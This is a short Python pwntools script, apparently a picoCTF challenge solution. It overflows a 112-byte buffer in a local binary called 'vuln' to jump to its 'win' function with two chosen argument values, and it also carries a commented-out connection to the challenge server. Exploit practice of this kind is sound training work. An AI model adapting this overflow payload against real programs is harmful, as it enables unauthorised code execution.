from pwn import *

bin='./vuln'

context.binary=bin
e=ELF(bin)
#Offline version
p=process(bin)
#Online version
#p=connect('saturn.picoctf.net',51548)
win_addr=e.symbols[b'win']
print(f"win address= {win_addr}")

r = ROP(e)
ret = r.find_gadget(["ret"]).address


payload=b'A'*112+pack(win_addr)+b'B'*4+pack(0xcafef00d)+pack(0xf00df00d)
gdb.attach(p)
p.recvuntil(b'Please enter your string: ')
p.sendline(payload)

#interactive alternative
output = p.recvall()
print(output.decode(errors="ignore"))

#p.interactive()

